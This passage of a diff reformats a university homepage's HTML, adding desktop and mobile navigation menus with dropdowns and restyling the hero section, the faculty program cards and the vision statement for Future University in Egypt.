+                        viewBox="0 0 24 24"
+                      >
+                        <path
+                          stroke-linecap="round"
+                          stroke-linejoin="round"
+                          stroke-width="2"
+                          d="M19 9l-7 7-7-7"
+                        ></path>
+                      </svg>
+                    </button>
+                    <div
+                      id="academicCalendarDropdown"
+                      class="absolute left-0 mt-2 w-48 bg-white rounded-md shadow-lg py-1 z-50 hidden"
+                    >
+                      <a
+                        href="#"
+                        class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                        >Fall 2025 Semester Summary</a
+                      >
+                      <a
+                        href="#"
+                        class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                        >Fall 2025 Highlights.</a
+                      >
+                      <a
+                        href="#"
+                        class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                        >Fall 2025 Semester Details</a
+                      >
+                      <a
+                        href="#"
+                        class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                        >Spring 2026 Semester Summary</a
+                      >
+                      <a
+                        href="#"
+                        class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                        >Spring 2026 Highlights</a
+                      >
+                      <a
+                        href="#"
+                        class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                        >Spring 2026 Semester Details</a
+                      >
+                      <a
+                        href="#"
+                        class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                        >Summer 2026 Semester Summary</a
+                      >
+                      <a
+                        href="#"
+                        class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                        >Summer 2026 Highlights</a
+                      >
+                      <a
+                        href="#"
+                        class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                        >Summer 2026 Semester Details</a
+                      >
+                    </div>
                   </div>
                 </div>
-                <i data-lucide="arrow-right" class="w-5 h-5 text-white"></i>
               </div>
-            </a>
 
+              <!-- Mobile menu button -->
+              <div class="md:hidden">
+                <button
+                  id="mobileMenuBtn"
+                  class="text-gray-700 hover:text-university-red focus:outline-none focus:text-university-red transition-colors"
+                >
+                  <svg
+                    class="h-6 w-6"
+                    fill="none"
+                    stroke="currentColor"
+                    viewBox="0 0 24 24"
+                  >
+                    <path
+                      id="menuIcon"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      stroke-width="2"
+                      d="M4 6h16M4 12h16M4 18h16"
+                    ></path>
+                    <path
+                      id="closeIcon"
+                      class="hidden"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      stroke-width="2"
+                      d="M6 18L18 6M6 6l12 12"
+                    ></path>
+                  </svg>
+                </button>
+              </div>
+            </div>
           </div>
 
-          <!-- Stats -->
-          <div class="grid grid-cols-2 sm:grid-cols-3 gap-2">
-            <div class="text-center p-6 rounded-md border border-gray-500/50 bg-black/30 backdrop-blur-sm">
-              <div class="text-xl sm:text-2xl font-semibold text-[#FACC15]">50+</div>
-              <div class="text-white">Programs</div>
+          <!-- Mobile Navigation Menu -->
+          <div
+            id="mobileMenu"
+            class="md:hidden hidden bg-white border-t border-gray-200"
+          >
+            <div class="px-4 pt-2 pb-3 space-y-1">
+              <!-- Language Selector Mobile -->
+
+              <a
+                href="#"
+                class="block px-3 py-2 text-base font-medium text-gray-700 hover:text-university-red hover:bg-gray-50 rounded-md transition-colors"
+                >Home</a
+              >
+
+              <!-- Mobile Student Guide -->
+              <div>
+                <button
+                  id="mobileStudentGuideBtn"
+                  class="w-full flex items-center justify-between px-3 py-2 text-base font-medium text-gray-700 hover:text-university-red hover:bg-gray-50 rounded-md transition-colors"
+                >
+                  Student Guide
+                  <svg
+                    class="h-4 w-4"
+                    fill="none"
+                    stroke="currentColor"
+                    viewBox="0 0 24 24"
+                  >
+                    <path
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      stroke-width="2"
+                      d="M19 9l-7 7-7-7"
+                    ></path>
+                  </svg>
+                </button>
+                <div
+                  id="mobileStudentGuideDropdown"
+                  class="ml-4 mt-2 space-y-1 hidden"
+                >
+                  <a
+                    href="#"
+                    class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md"
+                    >Admission Guide</a
+                  >
+                  <a
+                    href="#"
+                    class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md"
+                    >Course Registration</a
+                  >
+                  <a
+                    href="#"
+                    class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md"
+                    >Student Services</a
+                  >
+                  <a
+                    href="#"
+                    class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md"
+                    >Campus Life</a
+                  >
+                </div>
+              </div>
+
+              <!-- Mobile Study Plans -->
+              <div>
+                <button
+                  id="mobileStudyPlansBtn"
+                  class="w-full flex items-center justify-between px-3 py-2 text-base font-medium text-gray-700 hover:text-university-red hover:bg-gray-50 rounded-md transition-colors"
+                >
+                  Study Plans
+                  <svg
+                    class="h-4 w-4"
+                    fill="none"
+                    stroke="currentColor"
+                    viewBox="0 0 24 24"
+                  >
+                    <path
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      stroke-width="2"
+                      d="M19 9l-7 7-7-7"
+                    ></path>
+                  </svg>
+                </button>
+                <div
+                  id="mobileStudyPlansDropdown"
+                  class="ml-4 mt-2 space-y-1 hidden"
+                >
+                  <a
+                    href="#"
+                    class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md"
+                    >Undergraduate</a
+                  >
+                  <a
+                    href="#"
+                    class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md"
+                    >Graduate</a
+                  >
+                  <a
+                    href="#"
+                    class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md"
+                    >Doctoral</a
+                  >
+                  <a
+                    href="#"
+                    class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md"
+                    >Certificate Programs</a
+                  >
+                </div>
+              </div>
+
+              <!-- Mobile Academic Calendar -->
+              <div>
+                <button
+                  id="mobileAcademicCalendarBtn"
+                  class="w-full flex items-center justify-between px-3 py-2 text-base font-medium text-gray-700 hover:text-university-red hover:bg-gray-50 rounded-md transition-colors"
+                >
+                  Academic Calendar
+                  <svg
+                    class="h-4 w-4"
+                    fill="none"
+                    stroke="currentColor"
+                    viewBox="0 0 24 24"
+                  >
+                    <path
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      stroke-width="2"
+                      d="M19 9l-7 7-7-7"
+                    ></path>
+                  </svg>
+                </button>
+                <div
+                  id="mobileAcademicCalendarDropdown"
+                  class="ml-4 mt-2 space-y-1 hidden"
+                >
+                  <a
+                    href="#"
+                    class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md"
+                    >Fall Semester</a
+                  >
+                  <a
+                    href="#"
+                    class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md"
+                    >Spring Semester</a
+                  >
+                  <a
+                    href="#"
+                    class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md"
+                    >Summer Session</a
+                  >
+                  <a
+                    href="#"
+                    class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md"
+                    >Important Dates</a
+                  >
+                </div>
+              </div>
+            </div>
+          </div>
+        </nav>
+      </div>
+
+      <!-- Hero Section -->
+
+      <section
+        class="relative min-h-[650px] sm:min-h-[750px] lg:h-[850px] flex items-center px-2 md:px-8 lg:px-12"
+      >
+        <div
+          class="absolute inset-0 bg-cover bg-center"
+          style="
+            background-image: url('https://api.builder.io/api/v1/image/assets/TEMP/cb2af87c7c105e38a742a7ff6e0ccab58a35b804?width=3840');
+          "
+        ></div>
+        <div class="absolute inset-0 bg-black/40"></div>
+
+        <div
+          class="relative py-10 md:py-0 max-w-[1560px] mx-auto px-4 sm:px-6 lg:px-0 grid grid-cols-1 lg:grid-cols-2 gap-8 lg:gap-12 items-center"
+        >
+          <!-- Left Content -->
+          <div class="space-y-8 sm:space-y-10 text-center lg:text-left">
+            <div class="space-y-6">
+              <div
+                class="inline-flex items-center px-4 py-1.5 bg-[#B11116] text-white text-xs font-medium rounded-full"
+              >
+                FUTURE UNIVERSITY IN EGYPT
+              </div>
+
+              <div class="space-y-6">
+                <div class="space-y-2">
+                  <h1
+                    class="text-3xl sm:text-4xl md:text-5xl lg:text-6xl font-bold leading-tight"
+                  >
+                    <span class="text-white">Shape Your Future </span>
+                    <span class="text-[#FACC15]">Through Education</span>
+                  </h1>
+                  <div
+                    class="w-20 sm:w-24 md:w-28 h-1.5 bg-[#B11116] mx-auto lg:mx-0"
+                  ></div>
+                </div>
+                <p
+                  class="text-gray-200 text-base sm:text-lg leading-relaxed max-w-2xl mx-auto lg:mx-0"
+                >
+                  Discover a world-class education that prepares you for success
+                  in a global environment
+                </p>
+              </div>
             </div>
 
-            <div class="text-center p-6 rounded-md border border-gray-500/50 bg-black/30 backdrop-blur-sm">
-              <div class="text-xl sm:text-2xl font-semibold text-[#FACC15]">25k+</div>
-              <div class="text-white">Alumni</div>
+            <div class="space-y-6 sm:space-y-8">
+              <div class="relative max-w-[408px] mx-auto lg:mx-0">
+                <input
+                  type="text"
+                  placeholder="Search programs, courses, events..."
+                  class="w-full flex items-center gap-3 p-4 rounded-md border border-white/20 bg-white/5 backdrop-blur-sm text-gray-300 placeholder-gray-300 focus:outline-none focus:ring-1 focus:ring-white/30 pl-12"
+                />
+                <i
+                  data-lucide="search"
+                  class="absolute left-5 !top-[19px] w-5 h-5 text-gray-300 pointer-events-none"
+                ></i>
+              </div>
+
+              <button
+                class="flex items-center justify-center lg:justify-start gap-2 bg-[#B11116] text-white px-6 py-4 rounded-md shadow-lg hover:bg-[#A10F14] transition-colors mx-auto lg:mx-0"
+              >
+                <span class="font-medium">Explore Programs</span>
+                <i data-lucide="arrow-right" class="w-4 h-4"></i>
+              </button>
+            </div>
+          </div>
+
+          <!-- Right Content - Cards -->
+          <div class="space-y-8 sm:space-y-10">
+            <div class="flex flex-col gap-2">
+              <!-- Student Guide Card -->
+              <a href="student-guide.html">
+                <div
+                  class="flex items-center justify-between p-6 rounded-xl border border-gray-500/50 bg-black/30 backdrop-blur-sm"
+                >
+                  <div class="flex items-center gap-4">
+                    <div class="p-3 bg-[#B11116] rounded-md">
+                      <i data-lucide="book-open" class="w-8 h-8 text-white"></i>
+                    </div>
+                    <div>
+                      <h3 class="text-white text-lg font-semibold">
+                        Student Guide
+                      </h3>
+                      <p class="text-white/80">
+                        Essential information for students
+                      </p>
+                    </div>
+                  </div>
+                  <i data-lucide="arrow-right" class="w-5 h-5 text-white"></i>
+                </div>
+              </a>
+
+              <!-- Study Plans Card -->
+              <a href="study-plan.html">
+                <div
+                  class="flex items-center justify-between p-6 rounded-xl border border-gray-500/50 bg-black/30 backdrop-blur-sm"
+                >
+                  <div class="flex items-center gap-4">
+                    <div class="p-3 bg-[#B11116] rounded-md">
+                      <i
+                        data-lucide="graduation-cap"
+                        class="w-8 h-8 text-white"
+                      ></i>
+                    </div>
+                    <div>
+                      <h3 class="text-white text-lg font-semibold">
+                        Study Plans
+                      </h3>
+                      <p class="text-white/80">
+                        Academic pathways and programs
+                      </p>
+                    </div>
+                  </div>
+                  <i data-lucide="arrow-right" class="w-5 h-5 text-white"></i>
+                </div>
+              </a>
+
+              <!-- Academic Calendar Card -->
+              <a href="academic-calendar-and-list.html">
+                <div
+                  class="flex items-center justify-between p-6 rounded-xl border border-gray-500/50 bg-black/30 backdrop-blur-sm"
+                >
+                  <div class="flex items-center gap-4">
+                    <div class="p-3 bg-[#B11116] rounded-md">
+                      <i data-lucide="calendar" class="w-8 h-8 text-white"></i>
+                    </div>
+                    <div>
+                      <h3 class="text-white text-lg font-semibold">
+                        Academic Calendar
+                      </h3>
+                      <p class="text-white/80">Important dates and deadlines</p>
+                    </div>
+                  </div>
+                  <i data-lucide="arrow-right" class="w-5 h-5 text-white"></i>
+                </div>
+              </a>
+            </div>
+
+            <!-- Stats -->
+            <div class="grid grid-cols-2 sm:grid-cols-3 gap-2">
+              <div
+                class="text-center p-6 rounded-md border border-gray-500/50 bg-black/30 backdrop-blur-sm"
+              >
+                <div class="text-xl sm:text-2xl font-semibold text-[#FACC15]">
+                  50+
+                </div>
+                <div class="text-white">Programs</div>
+              </div>
+
+              <div
+                class="text-center p-6 rounded-md border border-gray-500/50 bg-black/30 backdrop-blur-sm"
+              >
+                <div class="text-xl sm:text-2xl font-semibold text-[#FACC15]">
+                  25k+
+                </div>
+                <div class="text-white">Alumni</div>
+              </div>
+
+              <div
+                class="text-center p-6 rounded-md border border-gray-500/50 bg-black/30 backdrop-blur-sm col-span-2 sm:col-span-1"
+              >
+                <div class="text-xl sm:text-2xl font-semibold text-[#FACC15]">
+                  90%
+                </div>
+                <div class="text-white">Employment</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Our Faculties Section -->
+      <section class="py-20 bg-gray-50 px-2 md:px-8 lg:px-12">
+        <div class="max-w-[1560px] mx-auto px-4 sm:px-6 lg:px-0">
+          <div class="text-center space-y-6 mb-20">
+            <h2 class="text-4xl font-bold text-[#B11116]">Our Faculties</h2>
+            <p class="text-gray-700 text-lg max-w-3xl mx-auto">
+              Explore our diverse range of faculties offering world-class
+              education and research opportunities
+            </p>
+          </div>
+
+          <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
+            <!-- Faculty Cards -->
+            <div
+              class="relative h-[416px] rounded-lg overflow-hidden shadow-lg group"
+            >
+              <div
+                class="absolute inset-0 bg-cover bg-center"
+                style="
+                  background-image: linear-gradient(
+                      0deg,
+                      rgba(124, 148, 164, 0.3) 0%,
+                      rgba(124, 148, 164, 0.3) 100%
+                    ),
+                    url('https://api.builder.io/api/v1/image/assets/TEMP/cc51a54b85d175c403bdb3e45ad1ea81100191d5?width=1008');
+                "
+              ></div>
+              <div class="relative p-6 h-full flex flex-col">
+                <div class="p-3 bg-white rounded-md w-fit mb-5">
+                  <i
+                    data-lucide="graduation-cap"
+                    class="w-8 h-8 text-[#B11116]"
+                  ></i>
+                </div>
+                <div class="flex-1">
+                  <h3 class="text-white text-xl font-medium mb-4">
+                    Faculty of Oral and Dental Medicine
+                  </h3>
+                  <p class="text-white text-sm leading-relaxed">
+                    Bachelor's in Dental Surgery (BDS); Master's in
+                    Prosthodontics, Aesthetic & Restorative Dentistry,
+                    Endodontics, Oral & Maxillofacial Surgery, Orthodontics,
+                    Pediatric Dentistry, Periodontology, Oral Health &
+                    Preventive Dentistry, Dental Biomaterials, Oral Medicine;
+                    Doctorates in Orthodontics, Oral & Maxillofacial Surgery
+                  </p>
+                </div>
+              </div>
             </div>
 
             <div
-              class="text-center p-6 rounded-md border border-gray-500/50 bg-black/30 backdrop-blur-sm col-span-2 sm:col-span-1">
-              <div class="text-xl sm:text-2xl font-semibold text-[#FACC15]">90%</div>
-              <div class="text-white">Employment</div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-
-
-
-    <!-- Our Faculties Section -->
-    <section class="py-20 bg-gray-50 px-2 md:px-8 lg:px-12">
-      <div class="max-w-[1560px] mx-auto px-4 sm:px-6 lg:px-0">
-        <div class="text-center space-y-6 mb-20">
-          <h2 class="text-4xl font-bold text-[#B11116]">Our Faculties</h2>
-          <p class="text-gray-700 text-lg max-w-3xl mx-auto">
-            Explore our diverse range of faculties offering world-class
-            education and research opportunities
-          </p>
-        </div>
-
-        <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
-          <!-- Faculty Cards -->
-          <div class="relative h-[416px] rounded-lg overflow-hidden  shadow-lg group">
-            <div class="absolute inset-0 bg-cover bg-center" style="
-    background-image: linear-gradient(
-        0deg,
-        rgba(124, 148, 164, 0.3) 0%,
-        rgba(124, 148, 164, 0.3) 100%
-      ),
-      url('https://api.builder.io/api/v1/image/assets/TEMP/cc51a54b85d175c403bdb3e45ad1ea81100191d5?width=1008');
-  "></div>
-            <div class="relative p-6 h-full flex flex-col">
-              <div class="p-3 bg-white rounded-md w-fit mb-5">
-                <i data-lucide="graduation-cap" class="w-8 h-8 text-[#B11116]"></i>
-              </div>
-              <div class="flex-1">
-                <h3 class="text-white text-xl font-medium mb-4">
-                  Faculty of Oral and Dental Medicine
-                </h3>
-                <p class="text-white text-sm leading-relaxed">
-                  Bachelor's in Dental Surgery (BDS); Master's in
-                  Prosthodontics, Aesthetic & Restorative Dentistry,
-                  Endodontics, Oral & Maxillofacial Surgery, Orthodontics,
-                  Pediatric Dentistry, Periodontology, Oral Health &
-                  Preventive Dentistry, Dental Biomaterials, Oral Medicine;
-                  Doctorates in Orthodontics, Oral & Maxillofacial Surgery
-                </p>
+              class="relative h-[416px] rounded-lg overflow-hidden shadow-lg group"
+            >
+              <div
+                class="absolute inset-0 bg-cover bg-center"
+                style="
+                  background-image: linear-gradient(
+                      0deg,
+                      rgba(155, 25, 21, 0.3) 0%,
+                      rgba(155, 25, 21, 0.3) 100%
+                    ),
+                    url('https://api.builder.io/api/v1/image/assets/TEMP/1b64fdd8b9442fffc5612d1a2b586d31f76d7854?width=1008');
+                "
+              ></div>
+              <div class="relative p-6 h-full flex flex-col">
+                <div class="p-3 bg-white rounded-md w-fit mb-5">
+                  <i
+                    data-lucide="graduation-cap"
+                    class="w-8 h-8 text-[#B11116]"
+                  ></i>
+                </div>
+                <div class="flex-1">
+                  <h3 class="text-white text-xl font-medium mb-4">
+                    Faculty of Pharmacy
+                  </h3>
+                  <p class="text-white text-sm leading-relaxed">
+                    Pharmacy (Pharm D), Pharmacy – Clinical Pharmacy (Pharm D),
+                    Postgraduate Diploma in Pharmacovigilance; Master's in
+                    Medicinal Chemistry, Pharmaceutical Analytical Chemistry,
+                    Pharmaceutics & Pharmaceutical Technology, Pharmacology &
+                    Toxicology, Biochemistry, Pharmacognosy, Microbiology &
+                    Immunology, Pharmacy Practice & Clinical Pharmacy;
+                    Doctorates in Pharmaceutical Sciences.
+                  </p>
+                </div>
               </div>
             </div>
-          </div>
 
-          <div class="relative h-[416px] rounded-lg overflow-hidden shadow-lg group">
-            <div class="absolute inset-0 bg-cover bg-center" style="
-    background-image: linear-gradient(
-        0deg,
-        rgba(155, 25, 21, 0.3) 0%,
-        rgba(155, 25, 21, 0.3) 100%
-      ),
-      url('https://api.builder.io/api/v1/image/assets/TEMP/1b64fdd8b9442fffc5612d1a2b586d31f76d7854?width=1008');
-  "></div>
-            <div class="relative p-6 h-full flex flex-col">
-              <div class="p-3 bg-white rounded-md w-fit mb-5">
-                <i data-lucide="graduation-cap" class="w-8 h-8 text-[#B11116]"></i>
-              </div>
-              <div class="flex-1">
-                <h3 class="text-white text-xl font-medium mb-4">
-                  Faculty of Pharmacy
-                </h3>
-                <p class="text-white text-sm leading-relaxed">
-                  Pharmacy (Pharm D), Pharmacy – Clinical Pharmacy (Pharm D),
-                  Postgraduate Diploma in Pharmacovigilance; Master's in
-                  Medicinal Chemistry, Pharmaceutical Analytical Chemistry,
-                  Pharmaceutics & Pharmaceutical Technology, Pharmacology &
-                  Toxicology, Biochemistry, Pharmacognosy, Microbiology &
-                  Immunology, Pharmacy Practice & Clinical Pharmacy;
-                  Doctorates in Pharmaceutical Sciences.
-                </p>
-              </div>
-            </div>
-          </div>
-
-          <div class="relative h-[416px] rounded-lg overflow-hidden shadow-lg group">
-            <div class="absolute inset-0 bg-cover bg-center" style="
+            <div
+              class="relative h-[416px] rounded-lg overflow-hidden shadow-lg group"
+            >
+              <div
+                class="absolute inset-0 bg-cover bg-center"
+                style="
                   background-image: linear-gradient(
                       0deg,
                       rgba(32, 87, 129, 0.8) 0%,
                       rgba(32, 87, 129, 0.8) 100%
                     ),
                     url('https://api.builder.io/api/v1/image/assets/TEMP/1c566de75ef94e7724c5290bc28c0e4b00579bc5?width=1008');
-                "></div>
-            <div class="relative p-6 h-full flex flex-col">
-              <div class="p-3 bg-white rounded-md w-fit mb-5">
-                <i data-lucide="graduation-cap" class="w-8 h-8 text-[#B11116]"></i>
-              </div>
-              <div class="flex-1">
-                <h3 class="text-white text-xl font-medium mb-4">
-                  Faculty of Engineering and Technology
-                </h3>
-                <p class="text-white text-sm leading-relaxed">
-                  Bachelor's in Mechatronics, Mechanical Power, Computer &
-                  Intelligent Systems, Computer & Communication, Electrical
-                  Power, Biomedical, Architectural, Interior Architecture,
-                  Structural & Construction Management, Petroleum Engineering;
-                  Postgraduate Diplomas, Professional Masters & MSc in
-                  Communication Engineering Technology.
-                </p>
-              </div>
-            </div>
-          </div>
-
-          <div class="relative h-[416px] rounded-lg overflow-hidden shadow-lg group">
-            <div class="absolute inset-0 bg-cover bg-center" style="
-  background-image: linear-gradient(
-      0deg,
-      rgba(232, 145, 61, 0.3) 0%,
-      rgba(232, 145, 61, 0.3) 100%
-    ),
-    url('https://api.builder.io/api/v1/image/assets/TEMP/3786371bb46d9b824adffe816a6938bb442dd5f8?width=1008');
-"></div>
-            <div class="relative p-6 h-full flex flex-col">
-              <div class="p-3 bg-white rounded-md w-fit mb-5">
-                <i data-lucide="graduation-cap" class="w-8 h-8 text-[#B11116]"></i>
-              </div>
-              <div class="flex-1">
-                <h3 class="text-white text-xl font-medium mb-4">
-                  Faculty of Computers and Information Technology
-                </h3>
-                <p class="text-white text-sm leading-relaxed">
-                  Bachelor's in Artificial Intelligence, Cybersecurity, Data
-                  Science, Computer Science, Information Systems, Digital
-                  Media Technology; Master's in Computer Science, Information
-                  Systems.
-                </p>
+                "
+              ></div>
+              <div class="relative p-6 h-full flex flex-col">
+                <div class="p-3 bg-white rounded-md w-fit mb-5">
+                  <i
+                    data-lucide="graduation-cap"
+                    class="w-8 h-8 text-[#B11116]"
+                  ></i>
+                </div>
+                <div class="flex-1">
+                  <h3 class="text-white text-xl font-medium mb-4">
+                    Faculty of Engineering and Technology
+                  </h3>
+                  <p class="text-white text-sm leading-relaxed">
+                    Bachelor's in Mechatronics, Mechanical Power, Computer &
+                    Intelligent Systems, Computer & Communication, Electrical
+                    Power, Biomedical, Architectural, Interior Architecture,
+                    Structural & Construction Management, Petroleum Engineering;
+                    Postgraduate Diplomas, Professional Masters & MSc in
+                    Communication Engineering Technology.
+                  </p>
+                </div>
               </div>
             </div>
-          </div>
 
-          <div class="relative h-[416px] rounded-lg overflow-hidden shadow-lg group">
-            <div class="absolute inset-0 bg-cover bg-center" style="
-  background-image: linear-gradient(
-      0deg,
-      rgba(124, 132, 56, 0.3) 0%,
-      rgba(124, 132, 56, 0.3) 100%
-    ),
-    url('https://api.builder.io/api/v1/image/assets/TEMP/2e85c861461e4a0803d49b3cdf75f104edcb5c11?width=1008');
-"></div>
-            <div class="relative p-6 h-full flex flex-col">
-              <div class="p-3 bg-white rounded-md w-fit mb-5">
-                <i data-lucide="graduation-cap" class="w-8 h-8 text-[#B11116]"></i>
-              </div>
-              <div class="flex-1">
-                <h3 class="text-white text-xl font-medium mb-4">
-                  Faculty of Economics and Political Science
-                </h3>
-                <p class="text-white text-sm leading-relaxed">
-                  Programs: Bachelor's in Political Media, Economics, Public
-                  Administration, Political Science.
-                </p>
+            <div
+              class="relative h-[416px] rounded-lg overflow-hidden shadow-lg group"
+            >
+              <div
+                class="absolute inset-0 bg-cover bg-center"
+                style="
+                  background-image: linear-gradient(
+                      0deg,
+                      rgba(232, 145, 61, 0.3) 0%,
+                      rgba(232, 145, 61, 0.3) 100%
+                    ),
+                    url('https://api.builder.io/api/v1/image/assets/TEMP/3786371bb46d9b824adffe816a6938bb442dd5f8?width=1008');
+                "
+              ></div>
+              <div class="relative p-6 h-full flex flex-col">
+                <div class="p-3 bg-white rounded-md w-fit mb-5">
+                  <i
+                    data-lucide="graduation-cap"
+                    class="w-8 h-8 text-[#B11116]"
+                  ></i>
+                </div>
+                <div class="flex-1">
+                  <h3 class="text-white text-xl font-medium mb-4">
+                    Faculty of Computers and Information Technology
+                  </h3>
+                  <p class="text-white text-sm leading-relaxed">
+                    Bachelor's in Artificial Intelligence, Cybersecurity, Data
+                    Science, Computer Science, Information Systems, Digital
+                    Media Technology; Master's in Computer Science, Information
+                    Systems.
+                  </p>
+                </div>
               </div>
             </div>
-          </div>
 
-          <div class="relative h-[416px] rounded-lg overflow-hidden shadow-lg group">
-            <div class="absolute inset-0 bg-cover bg-center" style="
-  background-image: linear-gradient(
-      0deg,
-      rgba(105, 106, 107, 0.1) 0%,
-      rgba(105, 106, 107, 0.1) 100%
-    ),
-    url('https://api.builder.io/api/v1/image/assets/TEMP/28c707500852f58aec8484f77829aa23f58101d3?width=1008');
-"></div>
-
-            <div class="relative p-6 h-full flex flex-col">
-              <div class="p-3 bg-white rounded-md w-fit mb-5">
-                <i data-lucide="graduation-cap" class="w-8 h-8 text-[#B11116]"></i>
+            <div
+              class="relative h-[416px] rounded-lg overflow-hidden shadow-lg group"
+            >
+              <div
+                class="absolute inset-0 bg-cover bg-center"
+                style="
+                  background-image: linear-gradient(
+                      0deg,
+                      rgba(124, 132, 56, 0.3) 0%,
+                      rgba(124, 132, 56, 0.3) 100%
+                    ),
+                    url('https://api.builder.io/api/v1/image/assets/TEMP/2e85c861461e4a0803d49b3cdf75f104edcb5c11?width=1008');
+                "
+              ></div>
+              <div class="relative p-6 h-full flex flex-col">
+                <div class="p-3 bg-white rounded-md w-fit mb-5">
+                  <i
+                    data-lucide="graduation-cap"
+                    class="w-8 h-8 text-[#B11116]"
+                  ></i>
+                </div>
+                <div class="flex-1">
+                  <h3 class="text-white text-xl font-medium mb-4">
+                    Faculty of Economics and Political Science
+                  </h3>
+                  <p class="text-white text-sm leading-relaxed">
+                    Programs: Bachelor's in Political Media, Economics, Public
+                    Administration, Political Science.
+                  </p>
+                </div>
               </div>
-              <div class="flex-1">
-                <h3 class="text-white text-xl font-medium mb-4">
-                  Faculty of Commerce and Business Administration
-                </h3>
-                <p class="text-white text-sm leading-relaxed">
-                  Bachelor's in Marketing, Management Information Systems,
-                  Accounting, Human Resources Management, Finance;
-                  Professional MBA in Business Administration, Project
-                  Management & Entrepreneurship, Marketing Management, Human
-                  Resources Management, Investment & Financial Markets.
-                </p>
+            </div>
+
+            <div
+              class="relative h-[416px] rounded-lg overflow-hidden shadow-lg group"
+            >
+              <div
+                class="absolute inset-0 bg-cover bg-center"
+                style="
+                  background-image: linear-gradient(
+                      0deg,
+                      rgba(105, 106, 107, 0.1) 0%,
+                      rgba(105, 106, 107, 0.1) 100%
+                    ),
+                    url('https://api.builder.io/api/v1/image/assets/TEMP/28c707500852f58aec8484f77829aa23f58101d3?width=1008');
+                "
+              ></div>
+
+              <div class="relative p-6 h-full flex flex-col">
+                <div class="p-3 bg-white rounded-md w-fit mb-5">
+                  <i
+                    data-lucide="graduation-cap"
+                    class="w-8 h-8 text-[#B11116]"
+                  ></i>
+                </div>
+                <div class="flex-1">
+                  <h3 class="text-white text-xl font-medium mb-4">
+                    Faculty of Commerce and Business Administration
+                  </h3>
+                  <p class="text-white text-sm leading-relaxed">
+                    Bachelor's in Marketing, Management Information Systems,
+                    Accounting, Human Resources Management, Finance;
+                    Professional MBA in Business Administration, Project
+                    Management & Entrepreneurship, Marketing Management, Human
+                    Resources Management, Investment & Financial Markets.
+                  </p>
+                </div>
               </div>
             </div>
           </div>
         </div>
-      </div>
-    </section>
+      </section>
 
-    <!-- About Future University Section -->
-    <section class="py-20 bg-white px-2 md:px-8 lg:px-12">
-      <div class="max-w-[1560px] mx-auto px-4 sm:px-6 lg:px-0">
-        <h2 class="text-4xl font-bold text-[#B11116] text-center mb-20">
-          About Future University
-        </h2>
+      <!-- About Future University Section -->
+      <section class="py-20 bg-white px-2 md:px-8 lg:px-12">
+        <div class="max-w-[1560px] mx-auto px-4 sm:px-6 lg:px-0">
+          <h2 class="text-4xl font-bold text-[#B11116] text-center mb-20">
+            About Future University
+          </h2>
 
-        <div class="space-y-12">
-          <!-- Vision, Mission, Core Values -->
-          <div class="grid md:grid-cols-3 gap-6">
-            <div
-              class="bg-white rounded-xl border-t-4 border-[#B11116] shadow-lg p-8 h-[521px] flex flex-col justify-between">
-              <div class="space-y-10">
-                <div class="p-3 bg-[#B11116]/10 rounded-full w-fit">
-                  <i data-lucide="target" class="w-8 h-8 text-[#B11116]"></i>
-                </div>
-                <div class="space-y-4">
-                  <h3 class="text-[#B11116] font-semibold">Our Vision</h3>
-                  <p class="text-gray-600 leading-relaxed">
-                    Future University aspires to be a leading model of
-                    excellence in education, scientific research, and
-                    community service, achieving local and regional prominence
-                    with international recognition.
-                  </p>
+          <div class="space-y-12">
+            <!-- Vision, Mission, Core Values -->
+            <div class="grid md:grid-cols-3 gap-6">
+              <div
+                class="bg-white rounded-xl border-t-4 border-[#B11116] shadow-lg p-8 h-[521px] flex flex-col justify-between"
+              >
+                <div class="space-y-10">
+                  <div class="p-3 bg-[#B11116]/10 rounded-full w-fit">
+                    <i data-lucide="target" class="w-8 h-8 text-[#B11116]"></i>
+                  </div>
+                  <div class="space-y-4">
+                    <h3 class="text-[#B11116] font-semibold">Our Vision</h3>
+                    <p class="text-gray-600 leading-relaxed">
+                      Future University aspires to be a leading model of
+                      excellence in education, scientific research, and
+                      community service, achieving local and regional prominence
+                      with international recognition.
+                    </p>
+                  </div>
                 </div>
               </div>
-              
+
+              <div
+                class="bg-white rounded-xl border-t-4 border-[#B11116] shadow-lg p-8 h-[521px] flex flex-col justify-between"
+              >
+                <div class="space-y-10">
+                  <div class="p-3 bg-[#B11116]/10 rounded-full w-fit">
+                    <i
+                      data-lucide="book-open"
+                      class="w-8 h-8 text-[#B11116]"
+                    ></i>
+                  </div>
+                  <div class="space-y-4">
